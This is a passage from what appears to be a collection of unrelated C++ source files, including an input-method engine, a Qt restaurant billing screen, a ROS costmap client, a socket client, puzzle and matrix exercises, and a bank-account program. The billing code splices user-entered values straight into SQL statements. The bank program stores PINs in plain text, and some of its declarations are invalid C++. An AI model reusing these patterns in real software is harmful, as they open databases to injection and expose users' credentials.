inputContext->updateUserInterface(UserInterfaceComponent::InputPanel);\n}\n\nvoid HazkeyEngine::deactivate(const InputMethodEntry &entry,\n                              InputContextEvent &event) {\n    FCITX_UNUSED(entry);\n    FCITX_DEBUG() << \"HazkeyEngine deactivate\";\n    auto inputContext = event.inputContext();\n    auto state = inputContext->propertyFor(&factory_);\n    state->reset();\n    inputContext->updatePreedit();\n    inputContext->updateUserInterface(UserInterfaceComponent::InputPanel);\n}\n\nFCITX_ADDON_FACTORY(HazkeyEngineFactory);\n\n}  // namespace fcitx\n",
    "#include \"token_ok.h\"\r\n#include \"ui_token_ok.h\"\r\n\r\n#include <QMessageBox>\r\n#include <QSqlQuery>\r\n#include <QDebug>\r\n#include <QSqlError>\r\n\r\nToken_ok::Token_ok(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::Token_ok)\r\n{\r\n    ui->setupUi(this);\r\n    pay = new Token_pay;\r\n\r\n}\r\n\r\nToken_ok::~Token_ok()\r\n{\r\n    delete ui;\r\n}\r\n\r\n// \u67e5\u770b\r\nvoid Token_ok::on_lookButton_clicked()\r\n{   \r\n    QString select = QString(\r\n        \"SELECT \u83dc\u54c1\u7f16\u53f7, \u83dc\u54c1\u540d\u79f0, \u83dc\u54c1\u5206\u7c7b, \u6298\u540e\u4ef7\u683c, \u4efd\u6570, \u53e3\u5473 \"\r\n        \"FROM OrderDetails \"\r\n        \"WHERE \u8ba2\u5355\u7f16\u53f7 = %1;\"\r\n    ).arg(order_id);\r\n\r\n    // QMessageBox::information(this, \"\u6267\u884c\u8bed\u53e5\", select);\r\n\r\n    ordernow->setQuery(select);\r\n    ui->order_now->setModel(ordernow);\r\n}\r\n\r\n// \u7ed3\u8d26\u754c\u9762\r\nvoid Token_ok::on_pay_clicked()\r\n{\r\n    // \u68c0\u67e5\u662f\u5426\u8f93\u5165\u6536\u94f6\u5458\u7f16\u53f7\r\n    if(ui->cashierid->text() == \"\"){\r\n        QMessageBox::information(this, \"\u7a0d\u7b49\u4e00\u4e0b\", \"\u8bf7\u8f93\u5165\u503c\u73ed\u7684\u6536\u94f6\u5458\u7f16\u53f7\u54e6~\");\r\n        return;\r\n    }\r\n\r\n    // \u5df2\u8f93\u5165\r\n    QSqlQuery query;\r\n    // \u83b7\u53d6\u6536\u94f6\u5355\u7f16\u53f7\r\n    query.prepare(QString(\"SELECT COUNT(*) FROM bills;\"));\r\n    if (!query.exec()) {\r\n        qDebug() << \"\u67e5\u8be2\u5931\u8d25: \" << query.lastError();\r\n        return;\r\n    }\r\n    if (query.next()) {\r\n        QVariant sumResult = query.value(0);\r\n        int temp = sumResult.toInt() + 1;\r\n\r\n        bill_id = QString::number(temp);\r\n        qDebug() << \" bill_id: \" << bill_id;\r\n    }\r\n\r\n    // \u8ba1\u7b97\u6536\u6b3e\u91d1\u989d\r\n    double result = 0;\r\n    // \u83b7\u53d6\u6a21\u578b\r\n    QAbstractItemModel* model = ui->order_now->model();\r\n    // \u904d\u5386\u6bcf\u4e00\u884c\r\n    for (int row = 0; row < model->rowCount(); ++row) {\r\n        bool ok;\r\n        // \u83dc\u54c1\u7f16\u53f70, \u83dc\u54c1\u540d\u79f01, \u83dc\u54c1\u5206\u7c7b2, \u6298\u540e\u4ef7\u683c3, \u4efd\u65704, \u53e3\u54735\r\n        // \u83b7\u53d6\u6298\u540e\u4ef7\u683c\uff0c\u4efd\u6570\r\n        QModelIndex price_index = model->index(row, 3);\r\n        double price = model->data(price_index).toDouble(&ok);\r\n        if (!ok) {\r\n            qWarning() << \"Failed to convert price to double.\";\r\n            continue;\r\n        }\r\n\r\n        QModelIndex num_index = model->index(row, 4);\r\n        double num = model->data(num_index).toDouble(&ok);\r\n        if (!ok) {\r\n            qWarning() << \"Failed to convert num to double.\";\r\n            continue;\r\n        }\r\n\r\n        // \u8fdb\u884c\u8fd0\u7b97\r\n        double temp = price * num;\r\n        result += temp;\r\n    }\r\n    //\u5916\u5e26\u52a0\u6536\u4e00\u5143\u6253\u5305\u8d39\r\n    result++;\r\n    // \u6700\u7ec8\u91d1\u989d\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\r\n    QString cost = QString::number(result, 'f', 2);\r\n\r\n    // \u83b7\u53d6\u6536\u94f6\u5458\u7f16\u53f7\r\n    cashier_id = ui->cashierid->text();\r\n\r\n    // \u63d2\u5165\u6536\u94f6\u5355\r\n    QString insert = QString(\"insert into bills(\u6536\u94f6\u5355\u7f16\u53f7,\u91d1\u989d,\u6536\u94f6\u5458\u7f16\u53f7,\u987e\u5ba2\u7f16\u53f7) values(%1,%2,%3,%4);\")\r\n                     .arg(bill_id,cost,cashier_id,custom_id);\r\n    // \u5982\u679c\u6536\u94f6\u5458\u7f16\u53f7\u9519\u8bef\r\n    if (!query.exec(insert)) {\r\n        QMessageBox::critical(this, \"\u6570\u636e\u5e93\u64cd\u4f5c\u9519\u8bef\", query.lastError().text());\r\n        return;\r\n    }\r\n    //QMessageBox::information(this, \"\u6267\u884c\u8bed\u53e5\", insert);\r\n\r\n    // \u66f4\u65b0\u5916\u5e26\u987e\u5ba2\u7684\u6536\u94f6\u5355,\u5e76\u66f4\u65b0\u987e\u5ba2\u72b6\u6001\r\n    QString updateQuery = QString(\"UPDATE token_customers SET \u6536\u94f6\u5355\u7f16\u53f7 = %1 WHERE \u5916\u5e26\u987e\u5ba2\u7f16\u53f7 = %2;\")\r\n                          .arg(bill_id,custom_id);\r\n    query.exec(updateQuery);\r\n\r\n    updateQuery = QString(\"UPDATE customers SET \u987e\u5ba2\u72b6\u6001 = '\u7ed3\u8d26' WHERE \u987e\u5ba2\u7f16\u53f7 = %1;\")\r\n                  .arg(custom_id);\r\n    query.exec(updateQuery);\r\n\r\n    pay->acceptid(order_id,custom_id,bill_id);\r\n    this->hide();\r\n    this->pay->show();\r\n}\r\n",
    "/*********************************************************************\n *\n * Software License Agreement (BSD License)\n *\n *  Copyright (c) 2015-2016, Jiri Horner.\n *  Copyright (c) 2021, Carlos Alvarez, Juan Galvis.\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions\n *  are met:\n *\n *   * Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above\n *     copyright notice, this list of conditions and the following\n *     disclaimer in the documentation and/or other materials provided\n *     with the distribution.\n *   * Neither the name of the Jiri Horner nor the names of its\n *     contributors may be used to endorse or promote products derived\n *     from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n *  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n *  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n *  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n *  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n *  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n *  POSSIBILITY OF SUCH DAMAGE.\n *\n *********************************************************************/\n\n#include <explore/costmap_client.h>\n#include <unistd.h>\n\n#include <functional>\n#include <mutex>\n#include <string>\n\nnamespace explore\n{\n// static translation table to speed things up\nstd::array<unsigned char, 256> init_translation_table();\nstatic const std::array<unsigned char, 256> cost_translation_table__ =\n    init_translation_table();\n\nCostmap2DClient::Costmap2DClient(rclcpp::Node& node, const tf2_ros::Buffer* tf)\n  : tf_(tf), node_(node)\n{\n  std::string costmap_topic;\n  std::string costmap_updates_topic;\n\n  node_.declare_parameter<std::string>(\"costmap_topic\", std::string(\"costmap\"));\n  node_.declare_parameter<std::string>(\"costmap_updates_topic\",\n                                       std::string(\"costmap_updates\"));\n  node_.declare_parameter<std::string>(\"robot_base_frame\", std::string(\"base_\"\n                                                                       \"link\"));\n  // transform tolerance is used for all tf transforms here\n  node_.declare_parameter<double>(\"transform_tolerance\", 0.3);\n\n  node_.get_parameter(\"costmap_topic\", costmap_topic);\n  node_.get_parameter(\"costmap_updates_topic\", costmap_updates_topic);\n  node_.get_parameter(\"robot_base_frame\", robot_base_frame_);\n  node_.get_parameter(\"transform_tolerance\", transform_tolerance_);\n\n  /* initialize costmap */\n  costmap_sub_ = node_.create_subscription<nav_msgs::msg::OccupancyGrid>(\n      costmap_topic, 1000,\n      [this](const nav_msgs::msg::OccupancyGrid::SharedPtr msg) {\n        costmap_received_ = true;\n        updateFullMap(msg);\n      });\n\n  // ROS1 CODE\n  // auto costmap_msg =\n  // ros::topic::waitForMessage<nav_msgs::msg::OccupancyGrid>(\n  //     costmap_topic, subscription_nh);\n\n  // Spin some until the callback gets called to replicate\n  // ros::topic::waitForMessage\n  RCLCPP_INFO(node_.get_logger(),\n              \"Waiting for costmap to become available, topic: %s\",\n              costmap_topic.c_str());\n  while (!costmap_received_) {\n    rclcpp::spin_some(node_.get_node_base_interface());\n    // Wait for a second\n    usleep(1000000);\n  }\n  // updateFullMap(costmap_msg); // this is already called in the callback of\n  // the costmap_sub_\n\n  /* subscribe to map updates */\n  costmap_updates_sub_ =\n      node_.create_subscription<map_msgs::msg::OccupancyGridUpdate>(\n          costmap_updates_topic, 1000,\n          [this](const map_msgs::msg::OccupancyGridUpdate::SharedPtr msg) {\n            updatePartialMap(msg);\n          });\n\n  // ROS1 CODE.\n  // TODO: Do we need this?\n  /* resolve tf prefix for robot_base_frame */\n  // std::string tf_prefix = tf::getPrefixParam(node_);\n  // robot_base_frame_ = tf::resolve(tf_prefix, robot_base_frame_);\n\n  // we need to make sure that the transform between the robot base frame and\n  // the global frame is available\n\n  // the global frame is set in the costmap callback. This is why we need to\n  // ensure that a costmap is received\n\n  /* tf transform is necessary for getRobotPose */\n  auto last_error = node_.now();\n  std::string tf_error;\n  while (rclcpp::ok() &&\n         !tf_->canTransform(global_frame_, robot_base_frame_,\n                            tf2::TimePointZero, tf2::d",
    "#include \"client.h\"\n#include <arpa/inet.h>\n#include <cerrno>\n#include <cstdio>\n#include <cstring>\n#include <iostream>\n#include <netinet/in.h>\n#include <strings.h>\n#include <sys/select.h>\n#include <sys/socket.h>\n#include <unistd.h>\n#include <vector>\n\nint Socket_Client::client_timeout_set(int sec, int usec)\n{\n    this->timeout.tv_usec = usec;\n    this->timeout.tv_sec = sec;\n    return 0;\n}\n\nint Socket_Client::socket_select_set(timeval* timeout_t)\n{\n    FD_ZERO(&this->read_set);\n    FD_SET(this->fd, &this->read_set);\n    FD_SET(STDIN_FILENO, &this->read_set);\n    socket_judge_maxfd();\n    if (select(this->fd + 1, &this->read_set, NULL, NULL, timeout_t) < 0) {\n        std::cerr << \"selext failed!!\" << std::endl;\n        return -1;\n    }\n    return 0;\n}\nint Socket_Client::client_handler_01()\n{\n    this->recv_buf.clear();\n    this->recv_buf.resize(this->read_buffer_size);\n    ssize_t readRet;\n    do {\n        readRet = read(STDIN_FILENO, this->recv_buf.data(), this->read_buffer_size);\n    } while (readRet == -1 && errno == EINTR);\n\n    if (readRet == 0) {\n        if (socket_close_fd(this->fd) < 0) {\n            return -1;\n        }\n        return -2;\n    }\n\n    if (readRet < 0) {\n        std::cerr << \"read failed!!\" << std::endl;\n        if (socket_close_fd(this->fd) < 0) {\n            return -1;\n        }\n        return -1;\n    }\n\n    if (readRet > 0) {\n        ssize_t sendRet = send(this->fd, this->recv_buf.data(), readRet, 0);\n        if (sendRet < 0) {\n            std::cerr << \"send failed!!\" << std::endl;\n            if (socket_close_fd(this->fd) < 0) {\n                return -1;\n            }\n            return -1;\n        }\n    }\n\n    // Check for quit message\n    std::string recv_msg(this->recv_buf.data(), readRet);\n    if (recv_msg.find(this->quit_msg) != std::string::npos) {\n        if (socket_close_fd(this->fd) < 0) {\n            return -1;\n        }\n        return -2;\n    }\n    return 0;\n}\n\nint Socket_Client::client_handler_02()\n{\n    int readret;\n    this->recv_buf.clear();\n    do {\n        readret = recv(this->fd, this->recv_buf.data(), this->read_buffer_size, 0);\n    } while (readret == -1 && errno == EINTR);\n    if (readret == 0) {\n        close(this->fd);\n        return -2;\n    }\n    if (readret > 0) {\n        std::cout.write(this->recv_buf.data(), readret);\n    }\n    if (readret < 0) {\n        std::cerr << \"recv failed!!\" << std::endl;\n        if (socket_close_fd(this->fd) < 0) {\n            return -1;\n        }\n    }\n    return 0;\n}\n\nSocket_Client::Socket_Client()\n    : Socket_Base()\n    , timeout{}\n{\n    FD_ZERO(&this->read_set);\n  \n    recv_buf.reserve(read_buffer_size);\n    recv_buf.clear();\n}\n\nint Socket_Client::socket_judge_set()\n{\n    if (FD_ISSET(STDIN_FILENO, &this->read_set)) {\n        if (client_handler_01() < 0) {\n            return -1;\n        }\n    }\n    if (FD_ISSET(this->fd, &this->read_set)) {\n        if (client_handler_02() < 0) {\n            return -1;\n        }\n    }\n    return 0;\n}\n\nSocket_Client::Socket_Client(int buffer_size)\n    : Socket_Base()\n    , read_buffer_size(buffer_size)\n    , timeout{}\n\n{\n    FD_ZERO(&this->read_set);\n    recv_buf.reserve(read_buffer_size);\n    recv_buf.clear();\n}\n\nSocket_Client::~Socket_Client()\n{\n    \n}\n\nint Socket_Client::socket_judge_maxfd()\n{\n    if (this->fd > maxfd) {\n        maxfd = this->fd;\n    }\n    return 0;\n}\n",
    "#include<iostream>\nusing namespace std;\n\nconst int MAX_SIZE = 100;\n\nclass matrix\n{\n    private:\n        int rows, cols;\n        int data[MAX_SIZE][MAX_SIZE];\n\n    public:\n        matrix(int r, int c) : rows(r), cols(c)\n        {\n            for (int i = 0; i < rows; i++)\n            {\n                for (int j = 0; j < cols; j++)\n                {\n                    data[i][j] = 0;\n                }\n            }\n        }\n\n        matrix operator+(matrix const& obj)\n        {\n            matrix res(rows, cols);\n            for (int i = 0; i < rows; i++)\n            {\n                for (int j = 0; j < cols; j++)\n                {\n                    res.data[i][j] = data[i][j] + obj.data[i][j];\n                }\n            }\n            return res;\n        }\n\n        matrix operator-(matrix const& obj)\n        {\n            matrix res(rows, cols);\n            for (int i = 0; i < rows; i++)\n            {\n                for (int j = 0; j < cols; j++)\n                {\n                    res.data[i][j] = data[i][j] - obj.data[i][j];\n                }\n            }\n            return res;\n        }\n\n        matrix operator*(matrix const& obj)\n        {\n            matrix res(rows, obj.cols);\n            for (int i = 0; i < rows; i++)\n            {\n                for (int j = 0; j < obj.cols; j++)\n                {\n                    res.data[i][j] = 0;\n                    for (int k = 0; k < cols; k++)\n                    {\n                        res.data[i][j] += data[i][k] * obj.data[k][j];\n                    }\n                }\n            }\n            return res;\n        }\n\n        void display()\n        {\n            for (int i = 0; i < rows; ++i)\n            {\n                for (int j = 0; j < cols; ++j)\n                {\n                    cout << data[i][j] << \"\\t\";\n                }\n                cout << endl;\n            }\n        }\n\n        void inputMatrix()\n        {\n            cout << \"Enter elements of the matrix:\" << endl;\n            for (int i = 0; i < rows; ++i)\n            {\n                for (int j = 0; j < cols; ++j)\n                {\n                    cin >> data[i][j];\n                }\n            }\n        }\n};\n\nint main()\n{\n    int rows, cols;\n    cout << \"Enter the number of rows for matrices: \";\n    cin >> rows;\n    cout << \"Enter the number of columns for matrices: \";\n    cin >> cols;\n\n    matrix m1(rows, cols), m2(rows, cols);\n\n    cout << \"Enter elements for matrix m1:\" << endl;\n    m1.inputMatrix();\n\n    cout << \"Enter elements for matrix m2:\" << endl;\n    m2.inputMatrix();\n\n    cout << \"Matrix m1:\" << endl;\n    m1.display();\n    cout << endl;\n\n    cout << \"Matrix m2:\" << endl;\n    m2.display();\n    cout << endl;\n\n    matrix m3 = m1 + m2;\n    cout << \"Addition:\" << endl;\n    m3.display();\n    cout << endl;\n\n    matrix m4 = m1 - m2;\n    cout << \"Subtraction:\" << endl;\n    m4.display();\n    cout << endl;\n\n    matrix m5 = m1 * m2;\n    cout << \"Multiplication:\" << endl;\n    m5.display();\n    cout << endl;\n\n    return 0;\n}\n",
    "#include <iostream>\n\n#include<vector>\n\nusing namespace std;\n\n#define nl \"\\n\"\n\nclass state{\n     \n\n    // checks if the given indices are valid\n    bool is_valid(int x, int y){\n        return x >= 0 && x <= 2 && y >= 0 && y <= 2;\n    }\n\n    // swaps two integers\n    void swap(int &a, int &b){\n        int c = a;\n        a = b;\n        b = c;\n    }\n\n    // returns the manhattan distance between two points\n    int manhattan_distance(pair<int, int> &a, pair<int, int> &b){\n        return abs(a.first - b.first) + abs(a.second - b.second);\n    }\n\n    public:\n\n    // the current state\n    vector<vector<int>> table;\n\n    state(){\n        // default parameter\n        for(int i = 0; i < 3; i++){\n            vector<int> v(3);\n            table.push_back(v);\n        }\n    }\n\n    // returns the heuristic value for the current state\n    // uses the manhattan distance between the position of each tile in the current state and the final state\n    int heuristic(state &final){\n        vector<pair<int, int>> pos_curr(9), pos_final(9);\n        for(int i = 0; i < 3; i++){\n            for(int j = 0; j < 3; j++){\n                pos_curr[table[i][j]] = {i, j};\n                pos_final[final.table[i][j]] = {i, j};\n            }\n        }\n        int cost = 0;\n        for(int i = 0; i < 9; i++){\n            cost += manhattan_distance(pos_curr[i], pos_final[i]);\n        }\n        return cost;\n    }\n\n    // returns a vector containing all the nieghbours of the current state\n    vector<state> generate_neighbours(){\n        vector<state> neighbours;\n        int params[4][2] = {{0, 1}, {0, -1}, {1, 0}, {-1 ,0}};\n        int x, y;\n        for(int i = 0; i < 3; i++){\n            for(int j = 0; j < 3; j++){\n                if(table[i][j] == 0){\n                    x = i;\n                    y = j;   \n                }\n            }\n        }\n        for(int i = 0; i < 4; i++){\n            int newx = x + params[i][0], newy = y + params[i][1];\n            if(!is_valid(newx, newy))\n                continue;\n            state temp;\n            temp.table = table;\n            swap(temp.table[newx][newy], temp.table[x][y]);\n            neighbours.push_back(temp);\n        }\n        return neighbours;\n    }\n\n    // prints the current state\n    void display(){\n        cout << nl;\n        for(int i = 0; i < 3; i++){\n            for(int j = 0; j < 3; j++){\n                cout << table[i][j] << \" \";\n            }\n            cout << nl;\n        }\n    }\n\n};\n\nvoid hill_climb(state &initial, state &final){\n\n    initial.display();\n    int best = initial.heuristic(final);\n    if(best == 0){\n        cout << \"\\nThe final state has been reached.\\n\";\n        return;\n    }\n\n    vector<state> neighbours = initial.generate_neighbours();\n    state next;\n    next.table = initial.table;\n\n\n    for(auto &neighbour: neighbours){\n        int curr = neighbour.heuristic(final);\n        if(curr < best){\n            best = curr;\n            next = neighbour;\n        }\n    }\n\n    if(next.table == initial.table){\n        cout << \"Stuck at a local minimum! Could not find any further path.\\n\";\n        return;\n    }\n   \n    hill_climb(next, final);\n\n}\n\nint main(){\n\n    state initial;\n    state final;\n    \n    // initial.table = {{1, 2, 3}, {4, 5, 6}, {0, 7, 8}};\n\n    // final.table = {{1, 2, 3}, {4, 5, 6}, {7, 8, 0}};\n\n    cout << \"Enter the initial state(use 0 for empty tile):\\n\";\n\n    for(int i = 0; i < 3; i++){\n        for(int j = 0; j < 3; j++)\n            cin >> initial.table[i][j];\n    }\n\n    cout << \"Enter the final state(use 0 for empty tile):\\n\";\n\n    for(int i = 0; i < 3; i++){\n        for(int j = 0; j < 3; j++)\n            cin >> final.table[i][j];\n    }\n\n    cout << \"\\nThe path is:\\n\";\n\n    hill_climb(initial, final);\n\n}\n",
    "\n// OpenCV\n#include <opencv2/core.hpp>\n#include <opencv2/core/mat.hpp>\n#include <opencv2/core/types.hpp>\n#include <opencv2/dnn.hpp>\n#include <opencv2/imgproc.hpp>\n\n// STL\n#include <vector>\n\n#include \"../include/inference.hpp\"\n#include \"../include/number_classifier.hpp\"\n\nstatic void using_once();\nstatic void Initialize()\n{\n    net_ =  cv::dnn::readNetFromONNX(number_classifier_model_path_);\n}\n\nstatic void using_once()\n{\n    std::call_once(flag_, Initialize);\n\n}\n//static cv::Mat perform_opening(const cv::Mat& input_image, int kernel_size) {\n//    // Check if the input image is valid\n//    if (input_image.empty()) {\n//        std::cerr << \"Input image is empty!\" << std::endl;\n//        return cv::Mat();\n//    }\n//\n//    // Create a structuring element (kernel) for the morphological operation\n//    cv::Mat kernel = cv::getStructuringElement(cv::MORPH_RECT, cv::Size(kernel_size, kernel_size));\n//\n//    // Perform the opening operation\n//    cv::Mat opened_image;\n//    cv::morphologyEx(input_image, opened_image, cv::MORPH_OPEN, kernel);\n//\n//    return opened_image;\n//}\n\nvoid extractNumbers(const cv::Mat & src, std::vector<OneArmor> & armors)\n{\n    // static int num = 0;\n    // Light length in image\n    const int light_length = 12;\n    // Image size after warp\n    const int warp_height = 28;\n    const int small_armor_width = 32;\n    const int large_armor_width = 54;\n    // Number ROI size\n    const cv::Size roi_size(20, 28);\n\n    for (auto & armor : armors) {\n        // Warp perspective transform\n        cv::Point2f lights_vertices[4] = {armor.objects_keypoints[1], armor.objects_keypoints[0], armor.objects_keypoints[3], armor.objects_keypoints[2]};\n\n        const int top_light_y = (warp_height - light_length) / 2 - 1;\n        const int bottom_light_y = top_light_y + light_length;\n        const int warp_width = small_armor_width;//\u5168\u6309\u5c0f\u88c5\u7532\u677f\u5904\u7406\n        cv::Point2f target_vertices[4] = {\n                cv::Point(0, bottom_light_y),\n                cv::Point(0, top_light_y),\n                cv::Point(warp_width - 1, top_light_y),\n                cv::Point(warp_width - 1, bottom_light_y),\n        };\n        cv::Mat number_image;\n        auto rotation_matrix = cv::getPerspectiveTransform(lights_vertices, target_vertices);\n        cv::warpPerspective(src, number_image, rotation_matrix, cv::Size(warp_width, warp_height));\n\n        // Get ROI\n        number_image =\n                number_image(cv::Rect(cv::Point((warp_width - roi_size.width) / 2, 0), roi_size));\n\n        // Binarize\n        std::vector<cv::Mat> channels(3);\n        cv::split(number_image, channels);\n\n        cv::cvtColor(number_image, number_image, cv::COLOR_RGB2GRAY);\n//\u4fdd\u5b58\u6570\u5b57\u56fe\u684820*28\n        // cv::imwrite(\"/home/gx/rm_classifier_training-main/\u8865_/\"+std::to_string(num++)+\".jpg\", number_image);\n        cv::threshold(number_image, number_image, 0, 255, cv::THRESH_BINARY | cv::THRESH_OTSU);\n        // cv::Mat number_img_ = perform_opening(number_image,2);\n\n        armor.number_img = number_image;\n\n    }\n}\n\nstd::vector<OneArmor> classify(cv::Mat src,std::vector<OneArmor> & armors)\n{\n    extractNumbers(src,armors);\n\n    using_once();\n    std::vector<OneArmor> armors_data_;\n\n    for (auto & armor : armors) {\n        cv::Mat image = armor.number_img.clone();\n\n        // Normalize\n        image = image / 255.0;\n\n        // Create blob from image\n        cv::Mat blob;\n        cv::dnn::blobFromImage(image, blob);\n\n        // Set the input blob for the neural network\n        net_.setInput(blob);\n        // Forward pass the image blob through the model\n        cv::Mat outputs = net_.forward();\n\n        // Do softmax\n        float max_prob = *std::max_element(outputs.begin<float>(), outputs.end<float>());\n        cv::Mat softmax_prob;\n        cv::exp(outputs - max_prob, softmax_prob);\n        float sum = static_cast<float>(cv::sum(softmax_prob)[0]);\n        softmax_prob /= sum;\n\n        double confidence;\n        cv::Point class_id_point;\n        minMaxLoc(softmax_prob.reshape(1, 1), nullptr, &confidence, nullptr, &class_id_point);\n        int label_id = class_id_point.x;\n\n        armor.number = class_names_[label_id];\n\n        for(auto i:armors){\n            if(i.number != \"negative\"){\n                armors_data_.push_back(i);\n            }\n        }\n\n    }\n    return armors_data_;\n}\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cupang\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n#include <iostream>\n#include <fstream>\n#include <cstring>\n#include <cstdio>\n#include <stdio.h>\n#ifdef _WIN32\n#include <Windows.h>\n#else\n#include <unistd.h>\n#endif\n\nusing namespace std;\n\nclass bank_acc\n{\npublic:\n    long acc_num;\n    string fname, lname;\n    float balance = 0;\n    float amount;\n    float depo;\n    long mobile_num;\n    int pin;\n    static long next_acc_num;\n\n    create_acc();\n    display_acc_details();\n    deposit_money();\n    withdraw_money();\n    modify_acc_details();\n    delete_acc();\n    friend ofstream &operator<<(ofstream &ofs, bank_acc &account);\n    friend ifstream &operator>>(ifstream &ifs, bank_acc &account);\n    friend ostream &operator<<(ostream &os, bank_acc &account);\n};\nlong bank_acc ::next_acc_num = 0;\nbank_acc ::create_acc()\n{\n    int pin_check;\n    cout << \"Enter your first name : \";\n    cin >> fname;\n    cout << endl;\n    cout << \"Enter your last name : \";\n    cin >> lname;\n    cout << endl;\n    cout << \"Enter your mobile number : \";\n    cin >> mobile_num;\n    cout << endl;\n    fflush(stdin);\nset_pin:\n    cout << \"Set a 4 digit pin as security pin(note : all values should be integers) : \";\n    cin >> pin;\n    cout << endl;\n    cout << \"Re-enter and Confirm pin : \";\n    cin >> pin_check;\n    cout << endl;\n\n    if (pin != pin_check)\n    {\n        cout << \"Both pins did'nt match. Try again \" << endl;\n        goto set_pin;\n    }\ndeposit:\n    cout << \"Enter money to deposit : \";\n    cin >> depo;\n    cout << endl;\n    if (depo < 500)\n    {\n        cout << \"Minimum Balance should be 500. Deposit amount more than 500. \" << endl;\n        goto deposit;\n    }\n    else\n        balance += depo;\n    acc_num = ++next_acc_num;\n\n    // system(\"cls\");\n    // Sleep(2000);\n    cout << \"\\t\\t\\t\\t\\tCONGRATULATIONS!!! \\n\\n\\t YOUR ACCOUNT IS SUCCESFULLY CREATED....\\n\\n\"\n         << endl;\n\n    cout << \"\\tYour account details : \" << endl;\n}\nofstream &operator<<(ofstream &ofs, bank_acc &account)\n{\n    ofs << account.acc_num << endl;\n    ofs << account.fname << endl;\n    ofs << account.lname << endl;\n    ofs << account.balance << endl;\n    ofs << account.mobile_num << endl;\n    ofs << account.pin << endl;\n    return ofs;\n}\nifstream &operator>>(ifstream &ifs, bank_acc &account)\n{\n    ifs >> account.acc_num;\n    ifs >> account.fname;\n    ifs >> account.lname;\n    ifs >> account.balance;\n    ifs >> account.mobile_num;\n    ifs >> account.pin;\n    return ifs;\n}\nostream &operator<<(ostream &os, bank_acc &account)\n{\n    os << \"\\n\\t \\t First Name : \" << account.fname << endl;\n    os << \"\\t \\t Last Name : \" << account.lname << endl;\n    os << \"\\t \\t Account Number : \" << account.acc_num << endl;\n    os << \"\\t \\t Current Balance : \" << account.balance << endl;\n\n    // os << \"\\t \\t Mobile Number : \" << account.mobile_num << endl;\n    return os;\n}\nvoid replace_pin(int acc_no, int new_pin)\n{\n    bank_acc Acc;\n    ifstream fin;\n    fin.open(\"user_data.data\");\n    ofstream fout;\n    fout.open(\"temp.data\");\n    while (!fin.eof())\n    {\n        fin >> Acc;\n        cout << Acc << endl;\n        if (Acc.acc_num == acc_no)\n        {\n            Acc.pin = new_pin;\n            fout << Acc << endl;\n        }\n        else\n            fout << Acc << endl;\n    }\n\n    fin.close();\n    fout.close();\n    // char filename[] = \"user_data.data\";\n    // int res = remove(filename);\n    // cout << res << endl ;\n    // rename(\"temp.data\", \"user_data.data\");\n}\nvoid new_user()\n{\n    bank_acc new_acc;\n    int choice;\n    // system(\"cls\");\n    cout << \"\\n \\t \\t \\t \\t \\t HELLO....\\n\"\n         << endl;\n    // Sleep(2000);\n    cout << \"\\t MENU:\\n\"\n         << endl;\n    cout << \"\\t 1.Create New Account\" << endl;\n    cout << \"\\t 2.Exit\\n\"\n         << endl;\nselect:\n    cout << \"Enter your choice:\";\n    cin >> choice;\n    // system(\"cls\");\n    switch (choice)\n    {\n    case 1:\n    {\n        cout << \"Please enter your details to continue :\\n\"\n             << endl;\n        new_acc.create_acc();\n        ofstream outfile;\n        outfile.open(\"user_data.data\", std::ios_base::app);\n        outfile << new_acc << endl;\n        outfile.close();\n        cout << new_acc << endl;\n        break;\n    }\n    case 2:\n    {\n        exit(0);\n        break;\n    }\n    default:\n    {\n        cout << \"\\tInvalid option. Select a valid one. \\n\";\n        goto select;\n    }\n    }\n}\nvoid existing_user()\n{\n    bank_acc Account;\n    long acc_no;\nretry:\n    cout << \"Enter your account number : \";\n    cin >> acc_no;\n    ifstream infile;\n    infile.open(\"user_data.data\");\n    if (!infile)\n    {\n        cout << \"Error in Opening! File Not Found!!\" << endl;\n        return;\n    }\n    bool acc_found = 